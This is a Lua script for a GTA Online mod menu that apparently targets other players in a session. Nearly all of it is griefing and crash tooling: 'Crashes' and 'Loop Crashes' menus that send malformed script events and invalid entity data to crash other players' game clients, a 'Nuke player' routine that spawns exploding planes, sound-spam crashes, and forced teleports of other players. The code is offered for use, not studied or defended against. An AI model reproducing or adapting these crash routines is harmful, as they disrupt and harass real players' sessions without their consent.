    function CreateVehicle(Hash, Pos, Heading, Invincible)
        STREAMING.REQUEST_MODEL(Hash)
        while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
        local SpawnedVehicle = entities.create_vehicle(Hash, Pos, Heading)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
        if Invincible then
            ENTITY.SET_ENTITY_INVINCIBLE(SpawnedVehicle, true)
        end
        return SpawnedVehicle
    end
    function CreatePed(index, Hash, Pos, Heading)
        STREAMING.REQUEST_MODEL(Hash)
        while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
        local SpawnedVehicle = entities.create_ped(index, Hash, Pos, Heading)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
        return SpawnedVehicle
    end
    function CreateObject(Hash, Pos, static)
        STREAMING.REQUEST_MODEL(Hash)
        while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
        local SpawnedVehicle = entities.create_object(Hash, Pos)
        STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
        if static then
            ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicle, true)
        end
        return SpawnedVehicle
    end

    function is_ped_player(ped)
        if PED.GET_PED_TYPE(ped) >= 4 then
            return false
        else
            return true
        end
    end

    local Crashes_List = menu.list(Removals_List, "Crashes", {"ytkcrasheslist"}, "")
    menu.divider(Crashes_List, "Yatekomo Crashes")

local planes = {'cuban800','titan','duster','luxor','Stunt','mammatus','velum','Shamal','Lazer','vestra','volatol','besra','dodo','alkonost','velum2','hydra','luxor2','nimbus','howard','alphaz1','seabreeze','nokota','molotok','starling','tula','microlight','rogue','pyro','mogul','strikeforce'} -- 'tr3','chernobog','avenger',
local coords = {
    {-1718.5878, -982.02405, 322.83115},
    {-2671.5007, 3404.2637, 455.1972},
    {9.977266, 6621.406, 306.46536 },
    {3529.1458, 3754.5452, 109.96472},
    {252, 2815, 120},
}
local to_ply = 1

function RqModel(hash)
    STREAMING.REQUEST_MODEL(hash)
    local count = 0
    util.toast("Requesting model...")
    while not STREAMING.HAS_MODEL_LOADED(hash) and count < 100 do
        STREAMING.REQUEST_MODEL(hash)
        count = count + 1
        util.yield(10)
    end
    if not STREAMING.HAS_MODEL_LOADED(hash) then
        util.toast("Tried for 1 second, couldn't load this specified model!")
    end
end

function GetLocalPed()
    return PLAYER.PLAYER_PED_ID()
end

G_GeneratedList = false --

function AddEntityToList(listName, handle, generatedCheck)
    if ((not G_GeneratedList) and generatedCheck) or (not generatedCheck) then
        G_GeneratedList = true
        local lis = menu.list(menu.my_root(), listName .. " handle " .. handle, {}, "")
        menu.action(lis, "Delete", {}, "", function()
            entities.delete_by_handle(handle)
            menu.delete(lis)
            G_GeneratedList = false
        end)
        menu.action(lis, "Teleport to entity", {}, "", function()
            local pos = ENTITY.GET_ENTITY_COORDS(handle)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(GetLocalPed(), pos.x, pos.y, pos.z + 1, false, false, false)
        end)
        menu.action(lis, "Drive Entity", {}, "", function()
            PED.SET_PED_INTO_VEHICLE(GetLocalPed(), handle, -1)
        end)
        menu.action(lis, "Teleport to you", {}, "", function()
            local pos = ENTITY.GET_ENTITY_COORDS(GetLocalPed())
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(handle, pos.x, pos.y, pos.z + 1, false, false, false)
        end)
    end
end


-- local jet_netID;
menu.toggle_loop(Crashes_List, "Ka-Chow", {}, "Press and hold down the enter button", function(on_toggle)
    if PED.IS_PED_IN_ANY_VEHICLE(GetLocalPed(), false) then
        local jet = PED.GET_VEHICLE_PED_IS_IN(GetLocalPed(), false)
        -- if VEHICLE.GET_VEHICLE_CLASS(jet) == 16 then --16 class is planes
        -- jet_netID = NETWORK.NETWORK_GET_NETWORK_ID_FROM_ENTITY(jet)
        ENTITY.SET_ENTITY_PROOFS(jet, true, true, true, true, true, true, true, true)
        -- ENTITY.SET_ENTITY_ROTATION(jet, 0, 0, 0, 2, true) -- rotation sync fuck
        -- local let_coords = coords[math.random(1, #coords)]--function() for i =1, 32 do if PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(i) then return ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(i)) end end end
        if players.exists(to_ply) then 
            local asda = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(to_ply)) 
            util.toast('Player ID: '..to_ply..' | asda.x: '.. asda.x.. 'asda.y: '.. asda.y..'asda.z: '.. asda.z)
            ENTITY.SET_ENTITY_COORDS(jet, asda.x, asda.y, asda.z + 50, false, false, false, true) 
            to_ply = to_ply +1
        else 
            if to_ply >= 32 then to_ply = 0 end
            to_ply = to_ply +1 
            local let_coords = coords[math.random(1, #coords)]
            ENTITY.SET_ENTITY_COORDS(jet, let_coords[1], let_coords[2], let_coords[3], false, false, false, true) 
        end
            
        ENTITY.SET_ENTITY_VELOCITY(jet, 0, 0, 0) -- velocity sync fuck
        ENTITY.SET_ENTITY_ROTATION(jet, 0, 0, 0, 2, true) -- rotation sync fuck
        local pedpos = ENTITY.GET_ENTITY_COORDS(GetLocalPed())
        pedpos.z = pedpos.z + 10
        for i = 1, 2 do
            local s_plane = planes[math.random(1, #planes)]
            RqModel(util.joaat(s_plane))
            local veha1 = entities.create_vehicle(util.joaat(s_plane), pedpos, 0)

            ENTITY.ATTACH_ENTITY_TO_ENTITY_PHYSICALLY(veha1, jet, 0, 0, 0, 0, 5 + (2 * i), 0, 0, 0, 0, 0, 0, 1000, true,
                true, true, true, 2)
        end
        AddEntityToList("Plane: ", jet, true)
        util.toast("Waiting 5sec for syncs...")
        util.yield(3500) -- 5k is original
        for i = 1, 25 do -- 50 is original
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(jet, math.random(0, 2555), math.random(0, 2815), math.random(1, 1232), false, false, false) 
            --ENTITY.SET_ENTITY_COORDS_NO_OFFSET(jet, 252, 2815, 120, false, false, false) -- far away teleport (sync fuck)
            util.yield()
        end
    else
        util.toast("Alert | You are not in a vehicle")
        RqModel(util.joaat('hydra'))
        local spawn_in = entities.create_vehicle(util.joaat('hydra'), ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID()), 0.0)
        PED.SET_PED_INTO_VEHICLE(PLAYER.PLAYER_PED_ID(), spawn_in, -1)
    end
end)



---@alias Entity integer

---@param entity Entity
---@param distance number
---@return userdata
GetCoordsInFrontOfEntity = function(entity, distance)
	if not ENTITY.DOES_ENTITY_EXIST(entity) then
		return v3.new(0.0, 0.0, 0.0)
	end
	local coords = ENTITY.GET_ENTITY_FORWARD_VECTOR(entity)
	coords:mul(distance)
	coords:add(ENTITY.GET_ENTITY_COORDS(entity, true))
	return coords
end

---@param entity Entity
RequestControl = function(entity, timeOut)
	timeOut = timeOut or 1000
	local start = util.current_time_millis()
	while not NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity) and
	util.current_time_millis() - start < timeOut do
		util.yield_once()
	end
	return util.current_time_millis() - start < timeOut
end

---@param list Entity[]
ClearEntities = function(list)
	for _, entity in ipairs(list) do
		if ENTITY.DOES_ENTITY_EXIST(entity) then
			ENTITY.SET_ENTITY_AS_MISSION_ENTITY(entity, false, false)
			RequestControl(entity)
			entities.delete_by_handle(entity)
		end
	end
end

function CreateVehicle(Hash, Pos, Heading, Invincible)
	STREAMING.REQUEST_MODEL(Hash)
	while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
	local SpawnedVehicle = entities.create_vehicle(Hash, Pos, Heading)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
	if Invincible then
		ENTITY.SET_ENTITY_INVINCIBLE(SpawnedVehicle, true)
	end
	return SpawnedVehicle
end

function CreateObject(Hash, Pos, static)
	STREAMING.REQUEST_MODEL(Hash)
	while not STREAMING.HAS_MODEL_LOADED(Hash) do util.yield() end
	local SpawnedVehicle = entities.create_object(Hash, Pos)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(Hash)
	if static then
		ENTITY.FREEZE_ENTITY_POSITION(SpawnedVehicle, true)
	end
	return SpawnedVehicle
end

-------------------------------------
-- PLAYER OPTIONS
-------------------------------------

PlayerOptions = function (pId)

    local spawnDistance = 250
	local vehicleType = { 'volatol', 'bombushka', 'jet', 'hydra', 'luxor2', 'seabreeze', 'tula', 'avenger2' }
	local selected = 1
    local antichashCam <const> = menu.ref_by_path("Game>Camera>Anti-Crash Camera", 38)
    local spawnedPlanes = {}
	
	menu.divider(menu.player_root(pId), "Nuker V3")
    menu.slider(menu.player_root(pId), "Nuke Distance", {}, "", 0, 500, spawnDistance, 25, function(distance)
    	spawnDistance = distance
    end)
	menu.list_select(menu.player_root(pId), 'Nuke Mode', {}, "", vehicleType, 1, function (opt)
		selected = opt
		-- print('Opt: '..opt..' | vehicleType: '..vehicleType[selected])
	end)

    menu.action(menu.player_root(pId), "Nuke player", {}, "", function ()
    	local playerPed = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pId)
    	local modelHash <const> = util.joaat(vehicleType[selected])
    	local startTime = util.current_time_millis()
    	local lastExplosion
    	local lastSpawn
    	menu.trigger_command(antichashCam, "on")
    	STREAMING.REQUEST_MODEL(modelHash)
    	while not STREAMING.HAS_MODEL_LOADED(modelHash) do
    		util.yield_once()
    	end
		util.toast("Crash | Nuker started. Enabled antichash cam to prevent crash.")
    	while util.current_time_millis() - startTime < 20000 do
			local pos = GetCoordsInFrontOfEntity(playerPed, spawnDistance)
    		pos.z = pos.z + 30.0
    		if not lastSpawn or util.current_time_millis() - lastSpawn > 10 then
    			local plane = entities.create_vehicle(modelHash, pos, 0.0)
    			NETWORK.SET_NETWORK_ID_EXISTS_ON_ALL_MACHINES(NETWORK.VEH_TO_NET(plane), true)
    			ENTITY.SET_ENTITY_AS_MISSION_ENTITY(plane, false, true)
    			NETWORK.SET_NETWORK_ID_ALWAYS_EXISTS_FOR_PLAYER(NETWORK.VEH_TO_NET(plane), players.user(), true)
    			table.insert(spawnedPlanes, plane)
    			lastSpawn = util.current_time_millis()
    		end
			if not lastExplosion or util.current_time_millis() - lastExplosion > 1000 then
				FIRE.ADD_EXPLOSION(pos.x, pos.y, pos.z, 0, 1.0, true, false, 0.0, false)
				lastExplosion = util.current_time_millis()
			end
			if not NETWORK.NETWORK_IS_PLAYER_CONNECTED(pId) then break end
    		util.yield_once()
    	end

    	ClearEntities(spawnedPlanes)
    	spawnedPlanes = {}
    	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED	(modelHash)
    	menu.trigger_command(antichashCam, "off")
    	util.toast("Crash | Nuker finished.")
    end)
end

players.on_join(function(pid)
    if G_GeneratedList then
        generatePlayerTeleports()
    end
    -- playerFuncs(pid)
end)

    menu.action(Crashes_List, "Host Crash", {""}, "", function()
    local myPos = ENTITY.GET_ENTITY_COORDS(PLAYER.PLAYER_PED_ID(), false)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), 10814.29, -9751.18, 2000.0, 0, 0, 1)--HOSTCRASH
    ENTITY.FREEZE_ENTITY_POSITION(PLAYER.PLAYER_PED_ID(),true)
    util.yield(1000)
    ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), 0, 0, 7.0, 0, 0, 1)
    ENTITY.FREEZE_ENTITY_POSITION(PLAYER.PLAYER_PED_ID(),false)
    end) 
    menu.action(Crashes_List, "Script Host Crash", {}, "", function()
        menu.trigger_commands("givesh " .. players.get_name(pid))
        util.yield(100)
            util.trigger_script_event(1 << pid, {495813132, pid,-4640169,0,0,0,-36565476,-53105203})

    end)

    menu.action(Crashes_List, "Mother Nature Crash", {}, "", function()
        local user = PLAYER.GET_PLAYER_PED(players.user())
        local model = util.joaat("h4_prop_bush_mang_ad")
        local pos = players.get_position(pid)
        local oldPos = players.get_position(players.user())
        BlockSyncs(pid, function() -- blocking outgoing syncs to prevent the lobby from crashing :5head:
            util.yield(100)
            ENTITY.SET_ENTITY_VISIBLE(user, false)
            ENTITY.SET_ENTITY_COORDS_NO_OFFSET(user, pos.x, pos.y, pos.z, false, false, false)
            PLAYER.SET_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user(), model)
            PED.SET_PED_COMPONENT_VARIATION(user, 5, 8, 0, 0)
            util.yield(500)
            PLAYER.CLEAR_PLAYER_PARACHUTE_PACK_MODEL_OVERRIDE(players.user())
            util.yield(2500)
            TASK.CLEAR_PED_TASKS_IMMEDIATELY(user)
            for i = 1, 5 do
                util.spoof_script("freemode", SYSTEM.WAIT) -- preventing wasted screen
            end
            ENTITY.SET_ENTITY_HEALTH(user, 0) -- killing ped because it will still crash others until you die (clearing tasks doesnt seem to do much)
            NETWORK.NETWORK_RESURRECT_LOCAL_PLAYER(oldPos.x, oldPos.y, oldPos.z, 0, false, false, 0)
            ENTITY.SET_ENTITY_VISIBLE(user, true)
        end)
    end)

    menu.action(Crashes_List,"AIO Crash", {""} ,"" , function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local allvehicles = entities.get_all_vehicles_as_handles()
        for i = 1, 3 do
            for i = 1, #allvehicles do
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 15, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 16, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 17, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 18, 1000)
                util.yield()
            end
        end
        util.trigger_script_event(1 << pid,{526822748,pid, 0, 2, 18969111})
        util.trigger_script_event(1 << pid,{-555356783,pid, 0, 2, 18969111})
        util.trigger_script_event(1 << pid,{-1390976345,pid, 0, 2, 18969111})
        util.trigger_script_event(1 << pid,{-637352381,pid, 0, 2, 18969111})
        util.trigger_script_event(1 << pid,{-1529596656,pid, 1, 0, 2, 0, 3, 30583, 4, 0, 5, 0, 6, 0, 7 -328966, 8, 1132039228, 9, 0})
        util.trigger_script_event(1 << pid,{-1991423686,pid, 0, 2, 18969111})
        util.trigger_script_event(1 << pid,{1992522613,pid, 1, 0, 2, 0, 3, 30583, 4, 0, 5, 0, 6, 0, 7 -328966, 8, 1132039228, 9, 0})
        util.trigger_script_event(1 << pid,{-714268990,pid, 1, 0, 2, 0, 3, 30583, 4, 0, 5, 0, 6, 0, 7 -328966, 8, 1132039228, 9, 0})
        util.trigger_script_event(1 << pid,{495813132,pid, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 1754244778, 10, 23135423, 11, 827870001, 12, 23135423})
        util.trigger_script_event(1 << pid,{-1247985006,pid, 0, 2, 1, 3, 1, 4, 1841685865, 5, 136236, 6, 27769, 7, -1450989833, 8, -2082595, 9, 1587193, 10, -6701543, 11, 147649, 12, 651264, 13, -2507024, 14, 11951923, 15, -833146974, 16, -1799182, 17, 2359273, 18, 4959292, 19, 1})
        util.trigger_script_event(1 << pid,{526822748,pid, 0, 2, 18969111})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, -17898883})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, 17398799})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, 15576064})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, -13128205})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, -10321649})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, 9846577})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, 15098687})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, 15098687})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, 21062401})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, -5065659})
        util.trigger_script_event(1 << pid,{1348481963,pid,  0, 2, 378775})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, 9497036})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, 8067058})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, -3322411})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, -17851944})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, -18386240})
        util.trigger_script_event(1 << pid,{-634789188,pid, 0, 2, -634789188})
        util.trigger_script_event(1 << pid,{-634789188,pid, 0, 2, -634789188})
        util.trigger_script_event(1 << pid,{-668341698,pid, 0, 2, -668341698})
        util.trigger_script_event(1 << pid, {1214823473, pid, 0, 0, 0, 0, 0})
        util.trigger_script_event(1 << pid, {2130458390, pid, 0, 1, 0, 0, 0})
    end)

    menu.action(Crashes_List, "Ghost crash", {}, "", function ()
        pedp = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PLAYER.PLAYER_ID())
        mypos = players.getposition(pedp)
        tr2 = 2078290630
        local vehicle = CreateVehicle(tr2, mypos,ENTITY.GET_ENTITY_HEADING(pedp),true)
        ENTITY.ATTACH_ENTITY_TOENTITY(vehicle, PLAYER.PLAYER_PED_ID(), 0, 0, 0, -10, 0, 0, 0, true, false, true, false, 0, true)
        playerped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        for i = 0, 10 do
        playerpos = ENTITY.GET_ENTITY_COORDS(playerped, true)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), playerpos.x, playerpos.y, playerpos.z, false, false, false)
        end
            util.yield(15)
        ENTITY.SET_ENTITY_COORDS_NO_OFFSET(PLAYER.PLAYER_PED_ID(), mypos.x, mypos.y, mypos.z, false, false, false)
    end)
    menu.action(Crashes_List, "5G Lite", {}, "5G?", function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local allvehicles = entities.get_all_vehicles_as_handles()
        for i = 1, 3 do
            for i = 1, #allvehicles do
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 15, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 16, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 17, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 18, 1000)
                util.yield()
            end
        end
    end)

    menu.action(Crashes_List,"Invalid Data Ultimate ", {""} ,"" , function()
        BadNetVehicleCrash3(pid)
        util.yield(1000)
    end)
    menu.action(Removals_List, "Lobby Crashes", {}, "Shotcut for Lobby Crashes", function()
        menu.trigger_commands("ytklobbycrashlist")
    end)
    local LoopRemovals_List = menu.list(Removals_List, "Loop Crashes", {"ytkloopcrashlist"}, "")

    menu.divider(LoopRemovals_List, "Yatekomo Loop Crashes")

    menu.toggle_loop(LoopRemovals_List,"AIO Loop", {""} ,"" , function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local allvehicles = entities.get_all_vehicles_as_handles()
        for i = 1, 3 do
            for i = 1, #allvehicles do
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 15, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 16, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 17, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 18, 1000)
                util.yield()
            end
         end
        util.trigger_script_event(1 << pid,{526822748,pid, 0, 2, 18969111})
        util.trigger_script_event(1 << pid,{-555356783,pid, 0, 2, 18969111})
        util.trigger_script_event(1 << pid,{-1390976345,pid, 0, 2, 18969111})
        util.trigger_script_event(1 << pid,{-637352381,pid, 0, 2, 18969111})
        util.trigger_script_event(1 << pid,{-1529596656,pid, 1, 0, 2, 0, 3, 30583, 4, 0, 5, 0, 6, 0, 7 -328966, 8, 1132039228, 9, 0})
        util.trigger_script_event(1 << pid,{-1991423686,pid, 0, 2, 18969111})
        util.trigger_script_event(1 << pid,{1992522613,pid, 1, 0, 2, 0, 3, 30583, 4, 0, 5, 0, 6, 0, 7 -328966, 8, 1132039228, 9, 0})
        util.trigger_script_event(1 << pid,{-714268990,pid, 1, 0, 2, 0, 3, 30583, 4, 0, 5, 0, 6, 0, 7 -328966, 8, 1132039228, 9, 0})
        util.trigger_script_event(1 << pid,{495813132,pid, 23135423, 3, 3, 4, 827870001, 5, 2022580431, 6, -918761645, 7, 1754244778, 8, 827870001, 9, 1754244778, 10, 23135423, 11, 827870001, 12, 23135423})
        util.trigger_script_event(1 << pid,{-1247985006,pid, 0, 2, 1, 3, 1, 4, 1841685865, 5, 136236, 6, 27769, 7, -1450989833, 8, -2082595, 9, 1587193, 10, -6701543, 11, 147649, 12, 651264, 13, -2507024, 14, 11951923, 15, -833146974, 16, -1799182, 17, 2359273, 18, 4959292, 19, 1})
        util.trigger_script_event(1 << pid,{526822748,pid, 0, 2, 18969111})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, -17898883})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, 17398799})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, 15576064})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, -13128205})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, -10321649})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, 9846577})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, 15098687})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, 15098687})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, 21062401})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, -5065659})
        util.trigger_script_event(1 << pid,{1348481963,pid,  0, 2, 378775})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, 9497036})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, 8067058})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, -3322411})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, -17851944})
        util.trigger_script_event(1 << pid,{1348481963,pid, 0, 2, -18386240})
        util.trigger_script_event(1 << pid,{-634789188,pid, 0, 2, -634789188})
        util.trigger_script_event(1 << pid,{-668341698,pid, 0, 2, -668341698})
        util.trigger_script_event(1 << pid, {1214823473, pid, 0, 0, 0, 0, 0})
        util.trigger_script_event(1 << pid, {2130458390, pid, 0, 1, 0, 0, 0})
    end)

    menu.toggle_loop(LoopRemovals_List,"Script crash", {""} ,"" , function()
        util.trigger_script_event(1 << pid,{526822748,pid, 526822748})
        util.trigger_script_event(1 << pid,{-555356783,pid, -555356783})
        util.trigger_script_event(1 << pid,{495813132,pid, 495813132})
        util.trigger_script_event(1 << pid,{1992522613,pid, 1992522613})
        util.trigger_script_event(1 << pid,{1214823473,pid, 1214823473})
        util.trigger_script_event(1 << pid,{-634789188,pid, -634789188})
        util.trigger_script_event(1 << pid,{-668341698,pid, -668341698})
        util.trigger_script_event(1 << pid,{-1388926377,pid, -1388926377})
        util.trigger_script_event(1 << pid, {2130458390, pid, 0, 1, 0, 0, 0})
        util.trigger_script_event(1 << pid, {1214823473, pid, 0, 0, 0, 0, 0})
    end)
    menu.toggle_loop(LoopRemovals_List,"Razorable Crash", {""} ,"" , function()
        BadNetVehicleCrash(pid)
        util.yield(1000)
    end)

    menu.toggle_loop(LoopRemovals_List,"Orange 4G", {""} ,"" , function()
        local player = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local allvehicles = entities.get_all_vehicles_as_handles()
        for i = 1, 3 do
            for i = 1, #allvehicles do
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 15, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 16, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 17, 1000)
                util.yield()
                TASK.TASK_VEHICLE_TEMP_ACTION(player, allvehicles[i], 18, 1000)
                util.yield()
            end
        end
    end)
    local SoundRemovals_List = menu.list(Removals_List, "Sounds", {"command_for_list"}, "Description")

    menu.divider(SoundRemovals_List, "Spam sounds")

    menu.divider(SoundRemovals_List, "Errape and sounds crash")
    menu.action(SoundRemovals_List, "Sound Crash lobby", {}, "", function()
        local time = (util.current_time_millis() + 2000)
        while time > util.current_time_millis() do
            local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, '5s', pc.x, pc.y, pc.z, 'MP_MISSION_COUNTDOWN_SOUNDSET', 1, 10000, 0)
            end
            util.yield_once()
        end
    end)
    menu.action(SoundRemovals_List,"Sound Spam Crash", {}, "Crash Lobby", function()
        local TPP = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(PlayerID)
        local time = util.current_time_millis() + 2000
        while time > util.current_time_millis() do
        local TPPS = ENTITY.GET_ENTITY_COORDS(TPP, true)
            for i = 1, 20 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "Event_Message_Purple", TPPS.x,TPPS.y,TPPS.z, "GTAO_FM_Events_Soundset", true, 100000, false)
            end
            util.yield()
            for i = 1, 20 do
            AUDIO.PLAY_SOUND_FROM_COORD(-1, "5s", TPPS.x,TPPS.y,TPPS.z, "GTAO_FM_Events_Soundset", true, 100000, false)
            end
            util.yield()
        end
        util.toast("Sound Spam Crash [Lobby] executed successfully.")
    end)
    menu.action(SoundRemovals_List, "Errape Bed masturbator", {}, "", function()
        local time = (util.current_time_millis() + 2000)
        while time > util.current_time_millis() do
            local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "BED", pc.x, pc.y, pc.z, "WASTEDSOUNDS", true, 9999, false)
            end
            util.yield_once()
        end
    end)
    menu.action(SoundRemovals_List, "Errape ScreenFlash ", {}, "", function()
        local time = (util.current_time_millis() + 2000)
        while time > util.current_time_millis() do
            local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "ScreenFlash", pc.x, pc.y, pc.z, "WastedSounds", true, 9999, false)
            end
            util.yield_once()
        end
    end)
    menu.action(SoundRemovals_List, "Earrape Air_Defences", {}, "", function()
        local time = (util.current_time_millis() + 2000)
        while time > util.current_time_millis() do
            local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "Air_Defences_Activated", pc.x, pc.y, pc.z, "DLC_sum20_Business_Battle_AC_Sounds", true, 9999, false)
            end
            util.yield_once()
        end
    end)
    menu.action(SoundRemovals_List, "Errape Loser", {}, "", function()
        local time = (util.current_time_millis() + 2000)
        while time > util.current_time_millis() do
            local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "LOSER", pc.x, pc.y, pc.z, "HUD_AWARDS", true, 9999, false)
            end
            util.yield_once()
        end
    end)
    menu.action(SoundRemovals_List, "Errape Horny", {}, "", function()
        local time = (util.current_time_millis() + 2000)
        while time > util.current_time_millis() do
            local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "Horn", pc.x, pc.y, pc.z, "DLC_Apt_Yacht_Ambient_Soundset", true, 9999, false)
            end
            util.yield_once()
        end
    end)
    menu.action(SoundRemovals_List, "Errape Transition Penetrator", {}, "", function()
        local time = (util.current_time_millis() + 2000)
        while time > util.current_time_millis() do
            local pc = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
            for i = 1, 10 do
                AUDIO.PLAY_SOUND_FROM_COORD(-1, "1st_Person_Transition", pc.x, pc.y, pc.z, "PLAYER_SWITCH_CUSTOM_SOUNDSET", true, 9999, false)
            end
            util.yield_once()
        end
    end)
    menu.action(SoundRemovals_List, "stop all sounds", {}, "", function()
        for i=-1,100 do
            AUDIO.STOP_SOUND(i)
            AUDIO.RELEASE_SOUND_ID(i)
        end
    end)

    local Plyrtp_List = menu.list(Troll_List, "Teleport Player", {"ytkpltps"}, "")

    function RequestControl(entity)
        local tick = 0
        while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) and tick < 100000 do
            util.yield()
            NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
            tick = tick + 1
        end
    end

    menu.action(Plyrtp_List, "Teleport to prison", {}, "Teleport them to Prison [The player must be in a vehicle].", function()
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
        local veh = PED.GET_VEHICLE_PED_IS_IN(p, false)
        if PED.IS_PED_IN_ANY_VEHICLE(p, false) then
            RequestControl(veh)
            ENTITY.SET_ENTITY_COORDS(veh, 1652.5746, 2569.7756, 45.564854, false, false, false, false) --tp in prison
        else
            util.toast(players.get_name(pid).. " is not in a vehicle")
        end
    end)

    local Laggers_List = menu.list(Troll_List, "Laggers", {"ytklaggers"}, "")
    menu.divider(Laggers_List, "Yatekomo Laggers")

